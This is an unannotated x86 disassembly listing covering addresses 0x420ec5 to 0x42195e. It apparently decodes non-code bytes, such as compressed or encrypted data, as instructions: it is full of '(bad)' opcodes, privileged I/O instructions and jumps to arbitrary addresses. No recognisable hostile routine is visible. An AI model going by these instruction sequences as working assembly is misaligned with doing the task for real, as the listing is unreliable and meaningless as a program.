  420ec5:	cmp    DWORD PTR [ebx-0x7b],esp
  420ec8:	ins    DWORD PTR es:[edi],dx
  420ec9:	bound  esp,QWORD PTR [edx]
  420ecb:	xchg   edx,eax
  420ecc:	ja     0x420f0c
  420ece:	fcomp  QWORD PTR [esi-0x4]
  420ed1:	xor    al,0x56
  420ed3:	push   ecx
  420ed4:	and    ah,bh
  420ed6:	jmp    0x7ae3:0xca624750
  420edd:	adc    dh,dh
  420edf:	or     al,dh
  420ee1:	sahf   
  420ee2:	int3   
  420ee3:	mov    edx,DWORD PTR [ebx+0x51]
  420ee6:	inc    esp
  420ee7:	std    
  420ee8:	cld    
  420ee9:	mov    edx,0x7986c8b1
  420eee:	jb     0x420f17
  420ef0:	add    BYTE PTR [edi+0x27],ah
  420ef3:	int3   
  420ef4:	in     al,0xa5
  420ef6:	mov    ebx,0x2915a45a
  420efb:	cmc    
  420efc:	sar    cl,cl
  420efe:	mov    BYTE PTR [esi-0x7236e3f9],bh
  420f04:	(bad)  
  420f05:	pop    edi
  420f06:	mov    cl,0xe8
  420f08:	sbb    DWORD PTR [edi+0x5036fd5e],esi
  420f0e:	jmp    0x76608a60
  420f13:	pop    ebp
  420f14:	add    eax,0xf13c6a86
  420f19:	fild   WORD PTR [edx]
  420f1b:	loop   0x420f4a
  420f1d:	adc    ch,0x4d
  420f20:	cs retf 
  420f22:	or     esp,DWORD PTR [edi]
  420f24:	div    dh
  420f26:	adc    al,0xa7
  420f28:	retf   
  420f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f2a:	lock xchg DWORD PTR [edi-0xb8f067d],esi
  420f31:	pop    esi
  420f32:	nop
  420f33:	rcl    DWORD PTR [ebp-0x705ea205],0xb0
  420f3a:	cvtpi2ps xmm4,mm2
  420f3d:	mov    bl,0xb1
  420f3f:	hlt    
  420f40:	adc    al,0x93
  420f42:	(bad)  
  420f43:	cwde   
  420f44:	mov    ebp,0xc1d15e86
  420f49:	ret    0x2aad
  420f4c:	xor    esi,DWORD PTR [edx]
  420f4e:	jbe    0x420f99
  420f50:	jno    0x420f7b
  420f52:	repz aam 0x26
  420f55:	xor    al,0xfd
  420f57:	out    dx,al
  420f58:	fadd   DWORD PTR [edi-0x3019cc72]
  420f5e:	sub    esi,DWORD PTR [edx+esi*4+0x63]
  420f62:	in     eax,0xd6
  420f64:	dec    edx
  420f65:	loop   0x420fd9
  420f67:	fwait
  420f68:	add    edx,DWORD PTR [esi-0x7c]
  420f6b:	test   eax,0x129f
	...
  420fd4:	add    BYTE PTR [eax],al
  420fd6:	and    BYTE PTR [edi-0x28082cbe],dl
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x7111d70b]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [eax-0x3d691688],dl
  420ff3:	(bad)  
  420ff4:	pop    ebp
  420ff5:	call   0x58cb:0x48945388
  420ffc:	loope  0x42103d
  420ffe:	cmp    BYTE PTR [edx+0x7],bl
  421001:	mov    al,ds:0x196411ee
  421006:	loop   0x421008
  421008:	dec    ecx
  421009:	jnp    0x421016
  42100b:	je     0x420fca
  42100d:	push   edi
  42100e:	push   ds
  42100f:	add    ch,BYTE PTR [esi+eiz*2+0x1d]
  421013:	or     eax,0xe96a4bb1
  421018:	xor    dh,BYTE PTR fs:[edi+edi*8]
  42101c:	push   esi
  42101d:	sub    DWORD PTR [edi-0x417cd40a],edx
  421023:	mov    al,ds:0xe10acd01
  421028:	pop    eax
  421029:	mov    bl,cl
  42102b:	call   0x9868e7ab
  421030:	bound  edi,QWORD PTR [edx-0x2e5e31bb]
  421036:	dec    ebx
  421037:	scas   al,BYTE PTR es:[edi]
  421038:	inc    edx
  421039:	addr16 out dx,al
  42103b:	adc    cl,BYTE PTR [edx*2+0x4d5ee5e7]
  421042:	lahf   
  421043:	jns    0x421046
  421045:	add    bl,BYTE PTR [edi]
  421047:	push   esi
  421048:	cmp    dh,0x50
  42104b:	(bad)  
  42104c:	shl    BYTE PTR [eax-0x5e],cl
  42104f:	and    DWORD PTR [ebx+eax*4+0x796006d6],ebx
  421056:	sti    
  421057:	fsubp  st(6),st
  421059:	mov    DWORD PTR [esi+edx*2],edx
  42105c:	(bad)  
  42105d:	add    BYTE PTR [eax-0x6581628d],ch
  421063:	sbb    DWORD PTR [eax-0x1d3954b4],esi
  421069:	pop    eax
  42106a:	inc    esi
  42106b:	outs   dx,DWORD PTR ds:[esi]
  42106c:	imul   edi,ebx,0xffffff84
  42106f:	arpl   WORD PTR [ebx+0x3],ax
  421072:	hlt    
  421073:	fistp  QWORD PTR [ecx+ebp*4-0x946b53c]
  42107a:	test   bl,bh
  42107c:	cmp    edi,DWORD PTR [eax-0x261e7a1b]
  421082:	sbb    bh,bl
  421084:	fiadd  DWORD PTR [ecx-0x177fada6]
  42108a:	jnp    0x42101c
  42108c:	dec    esi
  42108d:	(bad)  
  42108e:	cld    
  42108f:	shr    BYTE PTR [ebx-0x40],cl
  421092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421093:	pop    es
  421094:	call   0x7b5af5ef
  421099:	sub    esp,DWORD PTR [ecx-0x285ecced]
  42109f:	call   0x3851:0xcae51e3a
  4210a6:	test   ebx,ebp
  4210a8:	xchg   ebp,eax
  4210a9:	push   edx
  4210aa:	aad    0xd
  4210ac:	adc    DWORD PTR [eax-0x449a7dbf],esp
  4210b2:	in     eax,0xd8
  4210b4:	in     al,dx
  4210b5:	and    al,0x70
  4210b7:	cmc    
  4210b8:	pop    ecx
  4210b9:	imul   eax,DWORD PTR [esp+eax*8],0x651209a1
  4210c0:	adc    ch,dl
  4210c2:	int    0x2e
  4210c4:	arpl   WORD PTR [esi],dx
  4210c6:	lods   eax,DWORD PTR ds:[esi]
  4210c7:	mov    ebx,0x45258570
  4210cc:	mov    cl,0x79
  4210ce:	dec    esi
  4210cf:	sbb    edi,DWORD PTR [ecx+0x4b]
  4210d2:	sahf   
  4210d3:	sbb    ecx,DWORD PTR [ebp+0x65]
  4210d6:	pop    ss
  4210d7:	and    ebx,esp
  4210d9:	inc    eax
  4210da:	push   es
  4210db:	repnz arpl WORD PTR [esi-0xe],bp
  4210df:	xor    bh,bh
  4210e1:	iret   
  4210e2:	popa   
  4210e3:	pop    eax
  4210e4:	pop    edx
  4210e5:	jge    0x421119
  4210e7:	push   cs
  4210e8:	fs sbb al,0xc4
  4210eb:	jmp    0x42ea16
	...
  421154:	add    BYTE PTR [eax],al
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ds,WORD PTR [ebx-0x34]
  421164:	adc    cl,BYTE PTR [ecx+0x16367]
  42116a:	add    BYTE PTR [ecx],al
  42116c:	add    BYTE PTR [eax],al
  42116e:	lds    ecx,FWORD PTR [ecx]
  421170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421171:	das    
  421172:	mov    al,0x6a
  421175:	add    DWORD PTR [esi-0x2d],esi
  421178:	test   al,0xf7
  42117a:	pop    esi
  42117b:	pop    esi
  42117c:	stc    
  42117d:	push   0x9418602f
  421182:	adc    al,0x9a
  421184:	ret    0xd056
  421187:	jg     0x42110e
  421189:	pop    ds
  42118a:	call   FWORD PTR [eax-0x598941bd]
  421190:	aaa    
  421191:	retf   0x4337
  421194:	xlat   BYTE PTR ds:[ebx]
  421195:	popf   
  421196:	in     eax,0x85
  421198:	and    ebp,ebx
  42119a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42119b:	jae    0x4211e1
  42119d:	mov    al,ds:0xf5241ad0
  4211a2:	pop    ecx
  4211a3:	(bad)  [esi+edi*2+0x3f]
  4211a7:	dec    edi
  4211a8:	mov    ebp,0x1236703d
  4211ad:	jmp    0x421213
  4211af:	into   
  4211b0:	jo     0x4211a2
  4211b2:	into   
  4211b3:	mov    esp,0xee7505f6
  4211b8:	jl     0x421206
  4211ba:	test   DWORD PTR [eax],eax
  4211bc:	into   
  4211bd:	xchg   esi,eax
  4211be:	cdq    
  4211bf:	mov    cl,0x4e
  4211c1:	test   ebx,ebx
  4211c3:	inc    ebp
  4211c4:	and    edi,edi
  4211c6:	pop    ss
  4211c7:	mov    dh,0x84
  4211c9:	adc    al,0xab
  4211cb:	and    eax,0x9b3bac01
  4211d0:	sbb    eax,0x8a647006
  4211d5:	adc    ebx,DWORD PTR [esi+0x5cfa371]
  4211db:	inc    edi
  4211dc:	push   ds
  4211dd:	repnz lea edx,[eax+esi*4+0x60]
  4211e2:	xor    al,0xe2
  4211e4:	xor    ah,BYTE PTR [ecx]
  4211e6:	popf   
  4211e7:	jo     0x421208
  4211e9:	pop    ss
  4211ea:	fsub   QWORD PTR [ebx-0x434154ee]
  4211f0:	shl    DWORD PTR [esi-0x3d],1
  4211f3:	into   
  4211f4:	cmc    
  4211f5:	shr    esp,1
  4211f7:	and    ebx,DWORD PTR [ebx]
  4211f9:	aas    
  4211fa:	jl     0x421196
  4211fc:	mov    edi,0xba766ec8
  421201:	mov    bl,0xb9
  421203:	lock (bad) 
  421205:	stos   DWORD PTR es:[edi],eax
  421206:	add    eax,0x5a4987c8
  42120b:	jmp    0x31afb22c
  421210:	mov    al,0x50
  421212:	cmp    DWORD PTR [edi-0x64],0xffffffef
  421216:	(bad)  
  421217:	loope  0x421212
  421219:	push   ss
  42121a:	adc    eax,0x41fc5ccf
  42121f:	scas   eax,DWORD PTR es:[edi]
  421220:	fild   WORD PTR [ecx+eiz*2-0x2e853ca2]
  421227:	in     eax,dx
  421228:	(bad)  [eax+0x6b]
  42122b:	push   cs
  42122c:	push   ecx
  42122d:	(bad)  
  42122e:	pop    ss
  42122f:	nop
  421230:	dec    edx
  421231:	dec    ebp
  421232:	retf   
  421233:	xchg   edi,edi
  421235:	pop    edi
  421236:	push   es
  421237:	ss js  0x421299
  42123a:	not    esi
  42123c:	xor    ebp,edx
  42123e:	adc    BYTE PTR [edi+edi*2],al
  421241:	sahf   
  421242:	xchg   DWORD PTR [ebx-0x3e],ecx
  421245:	mov    dl,BYTE PTR [ebp+0x788a72da]
  42124b:	dec    ecx
  42124c:	inc    ebp
  42124d:	push   ds
  42124e:	ds mov dh,ch
  421251:	cdq    
  421252:	mov    WORD PTR ds:[ecx],gs
  421255:	test   al,0xb2
  421257:	or     cl,BYTE PTR [esi+ebx*2]
  42125a:	shl    DWORD PTR [edx],0x72
  42125d:	push   ebp
  42125e:	mov    edx,0x61c37e99
  421263:	add    al,0x7a
  421265:	in     eax,dx
  421266:	bound  ebp,QWORD PTR [ebx-0xc]
  421269:	xchg   esi,eax
  42126a:	mov    al,0xe5
  42126c:	test   DWORD PTR [ebp+0x0],esi
	...
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0x77a37ab3
  4212e4:	xor    al,0x9a
  4212e6:	add    DWORD PTR fs:[bx+si],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	and    ecx,0x59
  4212f1:	inc    esp
  4212f2:	jl     0x4212f3
  4212f4:	dec    edx
  4212f5:	or     eax,0x2087231b
  4212fa:	rcl    DWORD PTR [ebp+0x2b1931],1
  421300:	add    dl,BYTE PTR [eax]
  421302:	(bad)  
  421303:	iret   
  421304:	or     eax,0xb479559c
  421309:	scas   eax,DWORD PTR es:[edi]
  42130a:	test   BYTE PTR [esi-0x2c],al
  42130d:	pushf  
  42130e:	ss jecxz 0x42135e
  421311:	rol    dh,cl
  421313:	add    DWORD PTR [ebp+0x14a15845],eax
  421319:	cmp    cl,bh
  42131b:	push   ebx
  42131c:	mov    edi,0x5ab26f8
  421321:	jns    0x42134d
  421323:	mov    al,ds:0xdbd825ce
  421328:	pop    edi
  421329:	in     eax,0x7c
  42132b:	xlat   BYTE PTR ds:[ebx]
  42132c:	addr16 (bad) 
  42132e:	mov    esi,0x5261a72c
  421333:	aad    0xbc
  421335:	les    ecx,FWORD PTR [eax+eiz*4+0x72]
  421339:	int    0x77
  42133b:	mov    edi,0x55c540ab
  421340:	xchg   edi,eax
  421341:	pop    ss
  421342:	mov    bh,0xce
  421344:	pop    ecx
  421345:	sub    cl,bl
  421347:	aas    
  421348:	retf   
  421349:	push   ds
  42134a:	jmp    FWORD PTR [ecx-0x2]
  42134d:	lods   al,BYTE PTR ds:[esi]
  42134e:	jecxz  0x42138c
  421350:	jmp    0xf014:0xb34f74c2
  421357:	pop    esp
  421358:	push   edi
  421359:	inc    ebp
  42135a:	imul   esi,edx,0xda61848c
  421360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421361:	sub    bl,BYTE PTR [edi-0x78f38e61]
  421367:	ja     0x421379
  421369:	sbb    BYTE PTR [esi+0x10],ch
  42136c:	mov    eax,ds:0x5a8a8652
  421371:	push   edi
  421372:	or     BYTE PTR [edx-0x5ef84ffc],dh
  421378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421379:	imul   esi,DWORD PTR [eax+0x41],0x41
  42137d:	call   DWORD PTR [esp+ebx*4-0x60]
  421381:	cwde   
  421382:	mov    esi,esp
  421384:	fisub  DWORD PTR [edx-0x32eb125d]
  42138a:	dec    ecx
  42138b:	adc    al,0x72
  42138d:	or     BYTE PTR [eax],bh
  42138f:	push   ecx
  421390:	jmp    0x42131f
  421392:	ret    0x59c
  421395:	in     eax,dx
  421396:	retf   
  421397:	shl    ebp,cl
  421399:	mov    ebp,0xcbfe21ed
  42139e:	xchg   ah,bl
  4213a0:	out    0xe4,al
  4213a2:	adc    DWORD PTR [ebp+0x376abc01],esi
  4213a8:	xchg   ebp,eax
  4213a9:	lock xchg dh,bl
  4213ac:	loop   0x4213dd
  4213ae:	shl    BYTE PTR [ebp*1-0x50dbfc78],1
  4213b5:	xor    BYTE PTR [ecx-0x75],bh
  4213b8:	mov    cl,0x80
  4213ba:	xchg   edi,eax
  4213bb:	pop    ecx
  4213bc:	jo     0x4213dc
  4213be:	ror    ebx,0xcd
  4213c1:	ins    DWORD PTR es:[edi],dx
  4213c2:	or     eax,DWORD PTR [edx-0x3e]
  4213c5:	test   eax,0x76df9c9d
  4213ca:	retf   0xde71
  4213cd:	mov    ds:0x539fedea,eax
  4213d2:	lods   al,BYTE PTR ds:[esi]
  4213d3:	and    BYTE PTR [eax],al
  4213d5:	and    dh,dl
  4213d7:	add    al,0x4a
  4213d9:	std    
  4213da:	sub    ch,BYTE PTR [edi-0x37033e7a]
  4213e0:	out    0xf2,eax
  4213e2:	jmp    0x27032c38
  4213e7:	fsub   QWORD PTR ds:0x3a2073ec
  4213ed:	jno    0x4213ef
	...
  421453:	add    BYTE PTR [eax],al
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x40fef49f]
  421464:	lods   eax,DWORD PTR ds:[esi]
  421465:	mov    ecx,0x16567
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	mov    ebp,esi
  421470:	and    esp,DWORD PTR [ecx+0x7da2b151]
  421476:	xchg   BYTE PTR [eax+0x55],dh
  421479:	in     al,dx
  42147a:	ins    BYTE PTR es:[edi],dx
  42147b:	fcmovbe st,st(0)
  42147d:	shl    BYTE PTR [esi],1
  42147f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421480:	pop    ebp
  421481:	jb     0x42147c
  421483:	mov    ecx,0x95741044
  421488:	push   cs
  421489:	xor    DWORD PTR [ebx+0x5],ebx
  42148c:	pop    edi
  42148d:	test   al,0x0
  42148f:	mov    ds:0x5540857b,al
  421494:	(bad)  
  421495:	bound  edi,QWORD PTR [esi+edx*1-0x69]
  421499:	mov    ss,WORD PTR [ebp+edx*8-0x13a7d4e8]
  4214a0:	out    0x5f,eax
  4214a2:	loope  0x4214d5
  4214a4:	mov    esi,0x28f5c422
  4214a9:	or     DWORD PTR [ecx],ebx
  4214ab:	retf   
  4214ac:	mov    ecx,0x1af459bb
  4214b1:	mov    al,ds:0x94798a2a
  4214b6:	push   0x2e300d7b
  4214bb:	(bad)  
  4214bc:	outs   dx,DWORD PTR ds:[esi]
  4214bd:	ja     0x4214e5
  4214bf:	jne    0x421448
  4214c1:	fsub   QWORD PTR [ebp-0x237f8870]
  4214c7:	add    bh,BYTE PTR [edx]
  4214c9:	ins    BYTE PTR es:[edi],dx
  4214ca:	sbb    cl,BYTE PTR [ebp+0x2c]
  4214cd:	lahf   
  4214ce:	push   ebp
  4214cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214d0:	jge    0x421528
  4214d2:	popa   
  4214d3:	jmp    0xbdd433d
  4214d8:	aad    0x4d
  4214da:	sbb    edx,esp
  4214dc:	fs jle 0x42151b
  4214df:	add    edi,DWORD PTR [ebp+0xdfbef3f]
  4214e5:	outs   dx,DWORD PTR ds:[esi]
  4214e6:	add    eax,0x939b9fe1
  4214eb:	and    eax,DWORD PTR [esi+0x35d662b1]
  4214f1:	dec    esi
  4214f2:	push   esi
  4214f3:	add    esp,esp
  4214f5:	das    
  4214f6:	test   al,0xf6
  4214f8:	jnp    0x42147a
  4214fa:	pop    esi
  4214fb:	scas   al,BYTE PTR es:[edi]
  4214fc:	ja     0x4214d4
  4214fe:	xchg   ecx,eax
  4214ff:	cs push edx
  421501:	(bad)  
  421502:	ficomp DWORD PTR [ebp+0x71d74ce8]
  421508:	inc    eax
  421509:	push   edx
  42150a:	ja     0x421524
  42150c:	push   ss
  42150d:	xchg   ecx,eax
  42150e:	es or  eax,ecx
  421511:	pop    ebp
  421512:	xor    esp,edx
  421514:	(bad)  
  421515:	(bad)  
  421516:	dec    ecx
  421517:	xor    DWORD PTR [esi+0x37b527ce],0xdb0e52f8
  421521:	xlat   BYTE PTR ds:[ebx]
  421522:	sbb    dl,BYTE PTR [esp+ebp*8-0x56]
  421526:	push   edx
  421527:	and    al,0xf2
  421529:	cmp    BYTE PTR [ebp+0x7d74711],0x57
  421530:	xchg   ecx,eax
  421531:	add    eax,0xa66b3645
  421536:	push   ebx
  421537:	pop    edi
  421538:	sub    BYTE PTR [eax],0xa0
  42153b:	mov    ebp,0x8af330ea
  421540:	ror    DWORD PTR [eax-0x3bc79355],0x80
  421547:	test   BYTE PTR [edx+ebx*4],al
  42154a:	push   es
  42154b:	(bad)  
  42154c:	hlt    
  42154d:	sbb    eax,0x80cf581d
  421552:	aam    0x88
  421554:	imul   esp,DWORD PTR [ebx-0x9],0xdfd866d8
  42155b:	xlat   BYTE PTR ds:[ebx]
  42155c:	inc    esp
  42155d:	jmp    0x8f4e1be4
  421562:	mov    ds:0xc7d6e5d2,al
  421567:	leave  
  421568:	and    BYTE PTR [ebp+0x49521eaa],0x0
	...
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x27842b4],bp
  4215e4:	xchg   ebx,eax
  4215e5:	pop    edi
  4215e6:	add    WORD PTR [bx+si],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	mov    esp,0x4c885771
  4215f3:	in     eax,dx
  4215f4:	inc    esi
  4215f5:	lahf   
  4215f6:	aaa    
  4215f7:	xchg   edi,eax
  4215f8:	loopne 0x421596
  4215fa:	dec    edx
  4215fb:	dec    esi
  4215fc:	mov    al,0xbc
  4215fe:	push   0x257ff50
  421603:	jl     0x4215a2
  421605:	xor    ah,0x4a
  421608:	xchg   esi,eax
  421609:	fs push 0xffffffd1
  42160c:	inc    edi
  42160d:	rcl    DWORD PTR [eax],0x29
  421610:	std    
  421611:	inc    ebx
  421612:	or     eax,0x246dd765
  421617:	mov    eax,ds:0x18d895b1
  42161c:	leave  
  42161d:	mov    ebx,0xf3ce59f
  421622:	cs jo  0x421660
  421625:	addr16 addr16 push cs
  421628:	adc    eax,0x1a31f00
  42162d:	push   0x967f1fb
  421632:	sub    esi,ebx
  421634:	enter  0x6cea,0x40
  421638:	(bad)  [edx+0x3856c7e3]
  42163e:	dec    edx
  42163f:	retf   0xa6e1
  421642:	pop    edx
  421643:	cdq    
  421644:	cwde   
  421645:	aad    0x5e
  421647:	sbb    dl,BYTE PTR [ecx-0x16]
  42164a:	jecxz  0x42167d
  42164c:	jmp    0xc5f2:0xc5af174
  421653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421654:	xor    DWORD PTR [eax-0x21229811],0x8ab3803c
  42165e:	in     eax,0x68
  421660:	popa   
  421661:	clc    
  421662:	sub    al,0x80
  421664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421665:	dec    edi
  421666:	es mov dl,0xcc
  421669:	xchg   BYTE PTR [esi-0x1e],cl
  42166c:	neg    cl
  42166e:	mov    al,0xc2
  421670:	jno    0x421679
  421672:	cli    
  421673:	arpl   WORD PTR [ecx],dx
  421675:	pushf  
  421676:	jne    0x4216e4
  421678:	sub    BYTE PTR [esi],bh
  42167a:	sbb    DWORD PTR [ecx+0x75],0x75
  42167e:	pop    eax
  42167f:	sub    esp,DWORD PTR [ebx]
  421681:	dec    ebp
  421682:	push   ds
  421683:	test   ecx,ecx
  421685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421686:	adc    ah,cl
  421688:	das    
  421689:	inc    edx
  42168a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42168b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42168c:	scas   al,BYTE PTR es:[edi]
  42168d:	ins    BYTE PTR es:[edi],dx
  42168e:	mov    esp,0x357a7268
  421693:	jp     0x42169f
  421695:	xchg   esi,eax
  421696:	shr    DWORD PTR [edi+0x34fc5233],cl
  42169c:	loope  0x42167c
  42169e:	es mov dl,0x7f
  4216a1:	fsub   st(3),st
  4216a3:	test   al,0x59
  4216a5:	jbe    0x421634
  4216a7:	push   cs
  4216a8:	push   es
  4216a9:	(bad)  
  4216aa:	mov    cl,0xac
  4216ac:	mov    al,ds:0x7ddb042d
  4216b1:	jle    0x42164b
  4216b3:	fwait
  4216b4:	leave  
  4216b5:	not    BYTE PTR [ebp+0x4b]
  4216b8:	mov    eax,ds:0xd7ed7441
  4216bd:	mov    esp,0xcc482d5e
  4216c2:	jg     0x4216fc
  4216c4:	jg     0x421736
  4216c6:	test   eax,0x96a272a6
  4216cb:	cwde   
  4216cc:	ins    BYTE PTR es:[edi],dx
  4216cd:	aas    
  4216ce:	cmp    esp,DWORD PTR [eax-0x74]
  4216d1:	ins    BYTE PTR es:[edi],dx
  4216d2:	into   
  4216d3:	xor    al,0xc0
  4216d5:	sbb    ecx,DWORD PTR [edx+ebp*8-0x7bfb679f]
  4216dc:	sub    DWORD PTR [ebp+edx*1+0x30700301],eax
  4216e3:	scas   eax,DWORD PTR es:[edi]
  4216e4:	cmp    al,0x36
  4216e6:	add    BYTE PTR [edx+0x680ab35],al
  4216ec:	jno    0x4216cc
	...
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	pop    edi
  421763:	lods   al,BYTE PTR ds:[esi]
  421764:	adc    esp,DWORD PTR ss:[edi+0x67]
  421768:	add    DWORD PTR [eax],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	cwde   
  42176f:	or     BYTE PTR [edi+0x57],al
  421772:	mov    dl,0x36
  421774:	pop    ds
  421775:	lahf   
  421776:	sbb    edx,edx
  421778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421779:	and    esp,DWORD PTR [eax+0x23]
  42177c:	das    
  42177d:	adc    eax,edi
  42177f:	cs push ebx
  421781:	imul   ebx,DWORD PTR [edx-0xc],0x3c305675
  421788:	iret   
  421789:	mov    ds:0x440dd8fc,eax
  42178e:	adc    dh,0xa0
  421791:	and    dl,dl
  421793:	xor    DWORD PTR [esp+edx*8-0x35],esi
  421797:	ja     0x421773
  421799:	call   0xfb35fdc3
  42179e:	dec    esi
  42179f:	adc    eax,0x56b15400
  4217a4:	dec    ebx
  4217a5:	push   es
  4217a6:	lods   eax,DWORD PTR es:[esi]
  4217a8:	lods   eax,DWORD PTR ds:[esi]
  4217a9:	jle    0x42174b
  4217ab:	sub    al,0xaf
  4217ad:	dec    ebx
  4217ae:	mov    WORD PTR [esi+0xf],cs
  4217b1:	aam    0xfb
  4217b3:	mov    BYTE PTR [eax],ah
  4217b5:	xor    BYTE PTR [edi+eiz*4+0x7e],cl
  4217b9:	rcr    ch,1
  4217bb:	pop    ebp
  4217bc:	mov    al,ds:0x70887821
  4217c1:	mov    eax,ds:0xf2fdff0a
  4217c6:	test   eax,0x54d21441
  4217cb:	sti    
  4217cc:	iret   
  4217cd:	xlat   BYTE PTR ds:[ebx]
  4217ce:	mov    edi,ss
  4217d0:	pop    ebx
  4217d1:	sub    BYTE PTR [ebp+0xf90b5f0],bl
  4217d7:	hlt    
  4217d8:	ins    BYTE PTR es:[edi],dx
  4217d9:	xor    bl,BYTE PTR [ecx*1-0x64347969]
  4217e0:	enter  0xafa,0x8b
  4217e4:	sub    al,0x6
  4217e6:	cmp    eax,0x42cfcacb
  4217eb:	add    BYTE PTR [eax+0x40],0x61
  4217ef:	sbb    edx,DWORD PTR ds:0xd00e502b
  4217f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217f6:	sbb    dl,dh
  4217f8:	aas    
  4217f9:	(bad)  
  4217fa:	mov    edx,0x80fd977f
  4217ff:	xor    al,0xb1
  421801:	pushf  
  421802:	(bad)  
  421803:	ins    BYTE PTR es:[edi],dx
  421804:	mov    bl,0xf
  421806:	inc    ebp
  421807:	jb     0x421865
  421809:	scas   eax,DWORD PTR es:[edi]
  42180a:	cwde   
  42180b:	(bad)  
  42180c:	xlat   BYTE PTR ds:[ebx]
  42180d:	dec    edx
  42180e:	mov    ds:0x4ff8db5d,al
  421813:	js     0x421815
  421815:	xchg   esp,eax
  421816:	add    al,BYTE PTR [ebp+0x1ed6ed1]
  42181c:	mov    esi,0x36b56dff
  421821:	ret    
  421822:	cmp    BYTE PTR fs:[ecx-0x38],0x76
  421827:	pusha  
  421828:	loop   0x421844
  42182a:	dec    eax
  42182b:	or     DWORD PTR [ebx+0x2888eb35],ebx
  421831:	dec    esi
  421832:	pop    esp
  421833:	pop    edi
  421834:	xor    eax,0x700771ff
  421839:	mov    ebp,0x407d0c9b
  42183e:	add    eax,0xf207a67e
  421843:	(bad)
  421848:	and    esi,esi
  42184a:	stos   DWORD PTR es:[edi],eax
  42184b:	(bad)  [ebx]
  42184d:	arpl   dx,bp
  42184f:	mov    eax,0x2227c8b5
  421854:	sbb    BYTE PTR [edi+eax*8],dl
  421857:	retf   
  421858:	(bad)  
  421859:	ss js  0x4218c0
  42185c:	or     DWORD PTR [eax],ebx
  42185e:	xor    al,0xd2
  421860:	mov    esp,0x709c754f
  421865:	sbb    al,0xdd
  421867:	repnz in al,dx
  421869:	fild   WORD PTR [ecx]
  42186b:	ror    dl,1
  42186d:	fadd   QWORD PTR [eax]
	...
  4218d3:	add    BYTE PTR [eax],al
  4218d5:	add    cl,dl
  4218d7:	mov    al,ds:0xf9f9e0b9
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	adc    al,0x17
  4218e4:	cmp    edi,esi
  4218e6:	addr16 push 0x1000001
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	std    
  4218ef:	sub    ebx,DWORD PTR [edx-0x30d2adce]
  4218f5:	jg     0x421932
  4218f7:	dec    ecx
  4218f8:	push   ds
  4218f9:	enter  0xd7e9,0x1b
  4218fd:	xor    DWORD PTR [ebx+0x9],0x40b951b5
  421904:	into   
  421905:	test   bl,dl
  421907:	xor    esi,ecx
  421909:	mov    WORD PTR [ebx+0x6a],ds
  42190c:	ficomp WORD PTR [eax+edx*4+0x13]
  421910:	mov    bh,0xf3
  421912:	dec    ebx
  421913:	ins    BYTE PTR es:[edi],dx
  421914:	adc    DWORD PTR ds:0xe367a457,ebp
  42191a:	nop
  42191b:	or     dl,BYTE PTR [ecx-0x510656da]
  421921:	and    BYTE PTR [ebx],ch
  421923:	fwait
  421924:	cmp    al,BYTE PTR [ebx+0x7fa26650]
  42192a:	out    dx,al
  42192b:	add    BYTE PTR [esi],bh
  42192d:	or     DWORD PTR [edx-0x5d2b7d5d],ebp
  421933:	mov    ds:0x81b9d64a,eax
  421938:	xor    edx,DWORD PTR [ebx-0x7f30058f]
  42193e:	ss hlt 
  421940:	int    0xdd
  421942:	xor    edx,DWORD PTR [eax]
  421944:	cmp    eax,0x62a27018
  421949:	lds    edx,FWORD PTR [ebx]
  42194b:	lds    esp,FWORD PTR [edi-0x72]
  42194e:	fwait
  42194f:	ds xor eax,0x253e76f7
  421955:	aas    
  421956:	xchg   DWORD PTR [ecx],esp
  421958:	sti    
  421959:	fadd   DWORD PTR [esp+eiz*4]
  42195c:	loopne 0x4219b6
  42195e:	jnp    0x4219d7
